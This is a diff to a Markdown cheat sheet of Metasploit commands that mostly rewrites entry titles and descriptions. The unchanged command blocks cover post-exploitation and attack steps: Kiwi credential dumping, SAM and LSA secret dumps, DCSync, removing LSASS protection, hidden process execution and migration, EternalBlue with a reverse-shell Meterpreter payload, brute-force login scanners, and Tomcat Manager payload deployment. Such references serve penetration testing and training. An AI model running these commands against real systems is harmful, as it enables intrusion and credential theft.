@@ -4,22 +4,18 @@
 
 ### List sessions
 
-List sessions with Metasploit.
-
 List active Metasploit sessions.
 
-```sh title:"Metasploit List Sessions"
+```sh title:"List Metasploit sessions"
 sessions -l
 ```
 <!-- cheat -->
 
 ### Upgrade session
 
-Spawn upgrade session with Metasploit.
-
 Upgrade a shell session to Meterpreter.
 
-```sh title:"Metasploit Spawn Upgrade Session"
+```sh title:"Metasploit Upgrade shell session to Meterpreter"
 sessions -u "$session_id"
 ```
 <!-- cheat
@@ -28,11 +24,9 @@ var session_id
 
 ### Route table
 
-Run route table with Metasploit.
-
 Print Metasploit's route table.
 
-```sh title:"Metasploit Run Route Table"
+```sh title:"Print Metasploit route table"
 route print
 ```
 <!-- cheat -->
@@ -41,11 +35,9 @@ route print
 
 ### Autoroute
 
-Run autoroute with Metasploit.
-
 Use the autoroute module for a session.
 
-```sh title:"Metasploit Run Autoroute"
+```sh title:"Use Metasploit autoroute module"
 use multi/manage/autoroute
 set SESSION $session_id
 run
@@ -56,11 +48,9 @@ var session_id
 
 ### SOCKS proxy
 
-Start SOCKS proxy with Metasploit.
-
 Start a Metasploit SOCKS proxy after adding routes.
 
-```sh title:"Metasploit Start SOCKS Proxy"
+```sh title:"Start Metasploit SOCKS proxy"
 use auxiliary/server/socks_proxy
 set SRVHOST 127.0.0.1
 run -j
@@ -71,33 +61,27 @@ run -j
 
 ### Load kiwi
 
-Run load kiwi with Metasploit.
-
 Load Kiwi into Meterpreter.
 
-```sh title:"Metasploit Run Load Kiwi"
+```sh title:"Metasploit Load Kiwi in Meterpreter"
 load kiwi
 ```
 <!-- cheat -->
 
 ### Dump credentials
 
-Dump credentials with Metasploit.
-
 Dump credentials with Kiwi.
 
-```sh title:"Metasploit Dump Credentials"
+```sh title:"Metasploit Dump credentials with Kiwi"
 creds_all
 ```
 <!-- cheat -->
 
 ### Dump SAM and secrets
 
-Dump SAM and secrets with Metasploit.
-
 Dump SAM and LSA secrets with Kiwi.
 
-```sh title:"Metasploit Dump SAM and Secrets"
+```sh title:"Metasploit Dump SAM and LSA secrets with Kiwi"
 lsa_dump_sam
 lsa_dump_secrets
 ```
@@ -105,11 +89,9 @@ lsa_dump_secrets
 
 ### DCSync
 
-Execute DCSync with Metasploit.
-
 Run Kiwi DCSync against a domain controller.
 
-```sh title:"Metasploit Execute DCSync"
+```sh title:"Metasploit Run Kiwi DCSync"
 dcsync "$domain_controller_name"
 ```
 <!-- cheat
@@ -118,11 +100,9 @@ var domain_controller_name
 
 ### Execute process
 
-Execute process with Metasploit.
-
 Create a hidden process from Meterpreter.
 
-```sh title:"Metasploit Execute Process"
+```sh title:"Metasploit Create hidden process from Meterpreter"
 execute -H -f "$process"
 ```
 <!-- cheat
@@ -131,11 +111,9 @@ var process := notepad.exe
 
 ### Migrate by name
 
-Run migrate by name with Metasploit.
-
 Migrate Meterpreter into a process by name.
 
-```sh title:"Metasploit Run Migrate by Name"
+```sh title:"Metasploit Migrate Meterpreter by process name"
 migrate -N "$process_name"
 ```
 <!-- cheat
@@ -144,11 +122,9 @@ var process_name := notepad.exe
 
 ### Remove PPL
 
-Remove PPL with Metasploit.
-
 Remove LSASS process protection with Kiwi, then dump credentials.
 
-```sh title:"Metasploit Remove PPL"
+```sh title:"Metasploit Remove LSASS PPL with Kiwi"
 load kiwi
 kiwi_cmd "!processprotect /process:lsass.exe /remove"
 creds_all
@@ -159,11 +135,9 @@ creds_all
 
 ### LAPS
 
-Run LAPS with Metasploit.
-
 Use the Windows LAPS gather module.
 
-```sh title:"Metasploit Run LAPS"
+```sh title:"Use Metasploit LAPS gather module"
 use post/windows/gather/laps
 set SESSION $session_id
 run
@@ -174,11 +148,9 @@ var session_id
 
 ### EternalBlue x64
 
-Execute EternalBlue x64 with Metasploit.
-
 Run MS17-010 EternalBlue with x64 Meterpreter payload.
 
-```sh title:"Metasploit Execute EternalBlue X64"
+```sh title:"Metasploit Run MS17-010 EternalBlue x64 Meterpreter"
 use exploit/windows/smb/ms17_010_eternalblue
 set RHOSTS $rhost_ip
 set payload windows/x64/meterpreter/reverse_tcp
@@ -194,11 +166,9 @@ var lport
 
 ### SMB login
 
-Scan SMB login with Metasploit.
-
 Run SMB login scanner with username and password files.
 
-```sh title:"Metasploit Scan SMB Login"
+```sh title:"Metasploit Run SMB login scanner"
 use auxiliary/scanner/smb/smb_login
 set RHOSTS $rhost_ip
 set USER_FILE $user_file
@@ -213,11 +183,9 @@ var pass_file
 
 ### SSH login
 
-Scan SSH login with Metasploit.
-
 Run SSH login scanner with username and password files.
 
-```sh title:"Metasploit Scan SSH Login"
+```sh title:"Metasploit Run SSH login scanner"
 use auxiliary/scanner/ssh/ssh_login
 set RHOSTS $rhost_ip
 set USER_FILE $user_file
@@ -232,11 +200,9 @@ var pass_file
 
 ### FTP login
 
-Scan FTP login with Metasploit.
-
 Run FTP login scanner with username and password files.
 
-```sh title:"Metasploit Scan FTP Login"
+```sh title:"Metasploit Run FTP login scanner"
 use auxiliary/scanner/ftp/ftp_login
 set RHOSTS $rhost_ip
 set USER_FILE $user_file
@@ -251,11 +217,9 @@ var pass_file
 
 ### Tomcat manager deploy
 
-Read tomcat manager deploy with Metasploit.
-
 Deploy a Meterpreter payload through Tomcat Manager.
 
-```sh title:"Metasploit Read Tomcat Manager Deploy"
+```sh title:"Metasploit Deploy Meterpreter through Tomcat Manager"
 use exploit/multi/http/tomcat_mgr_deploy
 set RHOSTS $rhost_ip
 set RPORT $rport
@@ -277,11 +241,9 @@ var lport
 
 ### Hashdump
 
-Dump hashdump with Metasploit.
-
 Run the Windows hashdump post module.
 
-```sh title:"Metasploit Dump Hashdump"
+```sh title:"Metasploit Run Windows hashdump post module"
 use post/windows/gather/hashdump
 set SESSION $session_id
 run
@@ -292,11 +254,9 @@ var session_id
 
 ### Credential collector
 
-Dump credential collector with Metasploit.
-
 Run the Windows credential collector post module.
 
-```sh title:"Metasploit Dump Credential Collector"
+```sh title:"Metasploit Run Windows credential collector post module"
 use post/windows/gather/credentials/credential_collector
 set SESSION $session_id
 run
